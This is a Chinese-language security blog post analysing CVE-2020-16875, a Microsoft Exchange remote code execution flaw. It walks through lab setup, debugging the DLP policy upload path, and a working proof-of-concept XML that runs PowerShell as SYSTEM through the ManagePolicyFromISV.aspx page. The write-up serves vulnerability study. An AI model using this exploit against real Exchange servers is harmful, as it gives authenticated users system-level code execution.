# Exchange漏洞分析系列 CVE-2020-16875

阅读量 **231404**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-10-15 15:00:57

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t010b354c2a1d248356.png)

2020-09-08微软发布漏洞通告CVE-2020-16875 | Microsoft Exchange Server 远程执行代码漏洞  
链接`https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-16875`  
由于对cmdlet参数的验证不正确，Microsoft
Exchange服务器中存在一个远程执行代码漏洞。成功利用此漏洞的攻击者可以在系统用户的上下文中运行任意代码。利用此漏洞需要拥有以某个Exchange角色进行身份验证的用户权限。

2020-09-11 srcincite发布POC。 链接`https://srcincite.io/advisories/src-2020-0019/`

由于自己一直对Exchange的相关漏洞比较感兴趣，于是赶紧搭建环境对该漏洞进行复现和分析工作。在此分享自己分析漏洞的一些过程，希望能帮助大家对漏洞有进一步的认识，也方便上手实践，并一起探讨学习！

## 环境工具准备

1.系统环境：

Windows Server 2016 Datacenter 64 位  
在其上搭建一个2016的AD(DC)域控制器(网上有很多搭建资料)

2.Exchange环境：

ExchangeServer2016-x64-cu14  
微软Exchange版本比对表`https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019`

PS：需要先安装以下三个组件，再安装Exchange。内存最好8G或以上，CPU2或以上。

    
    
    NDP472-KB4054530-x86-x64-AllOS-ENU.exe
    UcmaRuntimeSetup.exe
    vcredist_x64.exe (Microsoft Visual C++ 2013 Redistributable)
    

3.额外操作

Exchange环境搭建好后，请新建一个邮箱账户，比如hello。然后在服务器上打开`Exchange Management Shell`，并在其中执行：

    
    
    New-RoleGroup -Name "dlp users" -Roles "Data Loss Prevention" -Members "hello"
    Get-RoleGroup "dlp users" | Format-List
    

上面的操作是在对应账户hello上开启Data Loss Prevention角色(该漏洞利用需要满足的条件)

4.分析工具：

dnSpy v6.1.7 `https://github.com/0xd4d/dnSpy`

## DLP背景

> 防止数据丢失(Data loss Prevention)是Exchange Server
> 2013带来的一个新功能，感觉其实应该叫做防止数据泄露，许多第三方工具和设备也有类似的功能，而在Exchange
> 2013中直接集成了，并且之前的传输规则也整合到了一起。该功能通过对内容的深入分析，能够帮助企业识别、监控和保护敏感信息传递。  
>
> DLP通过关键字匹配、词典匹配、正则表达式的评估，和其他内容的检查，深入分析内容以发现组织内违法DLP规则的内容。一旦发现了违反了规则的内容，DLP会对用户进行提醒或者是组织，告知提醒用户邮件包含敏感内容或者违规传递。

## 漏洞分析

在浏览器中访问Exchange服务器，并以hello账户登录后，我们在URL中输入`https://XXX.XXX.XXX.XXX/ecp/DLPPolicy/ManagePolicyFromISV.aspx`，出现如下页面：

![](https://p1.ssl.qhimg.com/t0108139178d3b05c7a.png)

可以看到该页面可以上传一个DLP的策略模版XML文件。该XML文件模版样式可以从`https://docs.microsoft.com/en-us/exchange/developing-dlp-policy-template-files-exchange-2013-help`中找到。

![](https://p0.ssl.qhimg.com/t0101b558bfa4c69d40.png)

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <dlpPolicyTemplates>
      <dlpPolicyTemplate id="F7C29AEC-A52D-4502-9670-141424A83FAB" mode="Audit" state="Enabled" version="15.0.2.0">
        <contentVersion>4</contentVersion>
        <publisherName>Microsoft</publisherName>
        <name>
          <localizedString lang="en">PCI-DSSTest</localizedString>
        </name>
        <description>
          <localizedString lang="en">Detects the presence of information subject to Payment Card Industry Data Security Standard (PCI-DSS) compliance requirements.</localizedString>
        </description>
        <keywords></keywords>
        <ruleParameters></ruleParameters>
        <ruleParameters/>
        <policyCommands>
          <!-- The contents below are applied/executed as rules directly in PS - -->
          <commandBlock>
            <![CDATA[ new-transportRule "PCI-DSS: Monitor Payment Card Information Sent To Outside" -DlpPolicy "%%DlpPolicyName%%" -SentToScope NotInOrganization -SetAuditSeverity High -MessageContainsDataClassifications @{Name="Credit Card Number"; MinCount="1" } -Comments "Monitors payment card information sent to outside the organization as part of the PCI-DSS DLP Policy."]]>
          </commandBlock>
          <commandBlock>
            <![CDATA[ new-transportRule "PCI-DSS: Monitor Payment Card Information Sent To Within" -DlpPolicy "%%DlpPolicyName%%" -Comments "Monitors payment card information sent inside the organization as part of the PCI-DSS DLP Policy." -SentToScope InOrganization -SetAuditSeverity Low -MessageContainsDataClassifications @{Name="Credit Card Number"; MinCount="1" } ]]>
          </commandBlock>
        </policyCommands>
        <policyCommandsResources></policyCommandsResources>
      </dlpPolicyTemplate>
    </dlpPolicyTemplates>
    

我们将该内容保存到本地xml文件中，然后在ManagePolicyFromISV.aspx选择本地xml文件，随便写一个策略名称和对应描述，先不要点击保存按钮，因为我们要使用调试器附加进程，看看Exchange服务端的处理流程。

由于前面在浏览器上访问了ManagePolicyFromISV.aspx页面，aspx文件在.NET
Framework下运行一般会在`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary
ASP.NET
Files\ecp\`路径中生成App_Web_xxxx.dll。我们可以将这些dll拖入dnSpy工具中，并找到负责处理ManagePolicyFromISV.aspx页面的类，如下图

![](https://p1.ssl.qhimg.com/t010d762a65da8bad46.png)

aspx的请求处理大致流程可以参考`http://www.360doc.com/content/10/0826/14/2608032_48926077.shtml`和`https://www.jb51.net/article/35957.htm`

>
> ASP.NET页面中通过Page类定义的Context属性访问HttpContext对象。每个被访问的ASP.NET页面都会被转换为一个“派生自Page类的页面类”。Page类实现了IHttpHandler接口，此接口定义了一个ProcessRequest()方法。ASP.NET页面类生成以后被自动编译为程序集，然后其ProcessRequest()方法被自动调用。

因此，我们可以利用dnSpy工具先在System.Web.UI.Page类中的`public virtual void
ProcessRequest(HttpContext
context)`函数中下断点，然后具Attach上对应进程，进行调试。通过`/ecp/DLPPolicy/ManagePolicyFromISV.aspx`URL，我们可以推测下图进程会处理ECP模块的请求。

![](https://p0.ssl.qhimg.com/t0163d313c93fa6cfc0.png)

dnSpy工具设置断点和附加进程过程如下(方便上手)：

![](https://i.loli.net/2020/10/07/5uJfNihbeg2DMXY.gif)

一步步调试，我们可以发现，进入`System.Web.UI.Page`类的`ProcessRequest()`函数后，之后又会来到`ProcessRequestMain(bool
includeStagesBeforeAsyncPoint, bool
includeStagesAfterAsyncPoint)`函数。`ProcessRequestMain()`又会调用`LoadRecursive()`。LoadRecursive()根据对象的不同，又会进入不同的处理方法。

![](https://p2.ssl.qhimg.com/t01ec7fd3980aacc900.png)

最终进入`Microsoft.Exchange.Management.ControlPanel.DLPISVService`类中的`ExecuteUpload()`函数中。可以看到该函数中调用了一个`ProcessUpload`函数，其中传递的参数之一`TemplateData`就是我们上传DLP的策略模版XML文件的字节形式。

![](https://p1.ssl.qhimg.com/t01e5d3510a40da29f8.png)

我们跟随进入到`DLPISVService`类中的`ProcessUpload()`函数中，如下图，可以发现其即将调用和执行`PSCommand()
[Powershell cmdlet]`。我们的参数parameters将会被传给`New-DLPPolicy`这个cmdlet中。下图中我特意附上了调用堆栈，方便大家跟踪调试。

![](https://p1.ssl.qhimg.com/t013a814c82e57d23ca.png)

    
    
    >    Microsoft.Exchange.Management.ControlPanel.dll!Microsoft.Exchange.Management.ControlPanel.DLPISVService.ProcessUpload(Microsoft.Exchange.Management.ControlPanel.DLPPolicyUploadParameters parameters) (IL=0x0006, Native=0x00007FFF99CF4E50+0x15)
         Microsoft.Exchange.Management.ControlPanel.dll!Microsoft.Exchange.Management.ControlPanel.ManagePolicyFromISV.ExecuteUpload() (IL≈0x00CE, Native=0x00007FFF99CF48A0+0x298)
         Microsoft.Exchange.Management.ControlPanel.dll!Microsoft.Exchange.Management.ControlPanel.ManagePolicyFromISV.OnLoad(System.EventArgs e) (IL=epilog, Native=0x00007FFF99CE4410+0x10C)
         System.Web.dll!System.Web.UI.Control.LoadRecursive() (IL≈0x0011, Native=0x00007FFFE5E53100+0x100)
         System.Web.dll!System.Web.UI.Page.ProcessRequestMain(bool includeStagesBeforeAsyncPoint, bool includeStagesAfterAsyncPoint) (IL=0x04C3, Native=0x00007FFFE5E61250+0xEC9)
         System.Web.dll!System.Web.UI.Page.ProcessRequest(bool includeStagesBeforeAsyncPoint, bool includeStagesAfterAsyncPoint) (IL=0x003C, Native=0x00007FFFE5E60FF0+0x9F)
         System.Web.dll!System.Web.UI.Page.ProcessRequest() (IL≈0x0014, Native=0x00007FFFE5E60F60+0x4B)
         System.Web.dll!System.Web.UI.Page.ProcessRequest(System.Web.HttpContext context) (IL=epilog, Native=0x00007FFFE5E60EE0+0x46)
         App_Web_ojcsje1s.dll!ASP.dlppolicy_managepolicyfromisv_aspx.ProcessRequest(System.Web.HttpContext context) (IL=0x0007, Native=0x00007FFF99CDD310+0x2D)
    

此时我们的关注点转向`New-DLPPolicy`这个cmdlet。从微软官方的介绍中，可以看到使用New-DlpPolicy cmdlet的用法。

此cmdlet可在本地Exchange和基于云的服务中使用，使用DlpPolicy
cmdlet可以在您的Exchange组织中创建数据丢失防护(DLP)策略。

![](https://p0.ssl.qhimg.com/t01282634a6a8a55971.png)

具体使用的例子(使用US XXX 模版)：

![](https://p5.ssl.qhimg.com/t01a909d04db6a36539.png)

其中我们关注到一个参数，`-TemplateData`，可以传入字节形式的参数，与之前调试过程完全对应！

![](https://p5.ssl.qhimg.com/t019e015eb06ebfe07d.png)

我们再来看XML中的`<commandBlock>`字段，可以看到官方模版中是写了一个`new-transportRule`，这个也是Exchange中的一个cmdlet。如果这里写入Powershell 的cmdlet，是否会执行呢？

![](https://p2.ssl.qhimg.com/t01eda2bbf73b609ea1.png)

构造如下POC.XML文件，在`<commandBlock>`字段中写入创建一个cmd.exe的代码：

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <dlpPolicyTemplates>
      <dlpPolicyTemplate id="F7C29AEC-A52D-4502-9670-141424A83FAB" mode="Audit" state="Enabled" version="15.0.2.0">
        <contentVersion>4</contentVersion>
        <publisherName>Microsoft</publisherName>
        <name>
          <localizedString lang="en">PCI-DSS-12345</localizedString>
        </name>
        <description>
          <localizedString lang="en">Detects the presence of information subject to Payment Card Industry Data Security Standard (PCI-DSS) compliance requirements.</localizedString>
        </description>
        <keywords></keywords>
        <ruleParameters></ruleParameters>
        <policyCommands>
          <!-- The contents below are applied/executed as rules directly in PS - -->
          <commandBlock>
            <![CDATA[ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName="cmd";$i.Arguments="/c cmd.exe";$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start(); ]]>
          </commandBlock>
        </policyCommands>
        <policyCommandsResources></policyCommandsResources>
      </dlpPolicyTemplate>
    </dlpPolicyTemplates>
    

我们再到浏览器中的`/ecp/DLPPolicy/ManagePolicyFromISV.aspx`页面，上传POC.xml，策略名称要和上次的不同，否则会报该策略已安装。最后点击保存，即可在服务器端触发漏洞。见下面演示。

![](https://i.loli.net/2020/10/07/7E3Djrg19XTRB8q.gif)

另外，如果我们在Exchange服务器上使用`Exchange Management
Shell`执行下面命令，可以看到w3wp.exe进程也弹出了System权限的cmd.exe  
`New-DlpPolicy -Name "PCI-DSS-12345" -TemplateData ([Byte[]]$(Get-Content
-Path 'C:\work\poc.xml' -Encoding Byte -ReadCount 0))`

![](https://p4.ssl.qhimg.com/t01539db0a9fa44983e.png)

可见，该漏洞的原因在于Exchange的`New-DlpPolicy` cmdlet没有对-TemplateData中的XML数据进行任何检查，导致其能够以System权限执行一些非法命令。同时，开启DLP账户的`/ecp/DLPPolicy/ManagePolicyFromISV.aspx`页面又为远程调用`New-DlpPolicy`创造了条件，从而产生了RCE漏洞。

## 感悟

这个Exchange漏洞还是比较有意思的，其核心问题是对cmdlet参数处理不当，或者说没有验证参数是否合法。不过该漏洞需要对应账户开启Data Loss
Prevention角色，否则无法访问漏洞所在页面。在分析漏洞的过程中，我也掌握了如何搭建环境、调试、分析等技能，拓展了相关知识。下一篇计划研究经典的CVE-2020-0688漏洞，并结合.NET序列化与反序列化、ASP.NET等问题对漏洞成因深入分析，敬请期待~

## 参考资料

主要是微软的官方文档。

<https://docs.microsoft.com/en-us/exchange/developing-dlp-policy-template-files-exchange-2013-help>  
<https://blog.csdn.net/weixin_34004750/article/details/85173931>  
<https://docs.microsoft.com/zh-cn/powershell/module/exchange/new-dlppolicy?view=exchange-ps>  
<https://docs.microsoft.com/powershell/exchange/exchange-cmdlet-syntax>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **tahf** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/219091](/post/id/219091)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [Exchange](/tag/Exchange)

 **+1** __6赞

 __收藏

![](https://p3.ssl.qhimg.com/t013f72e0e9f8bf5b47.png) tahf

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

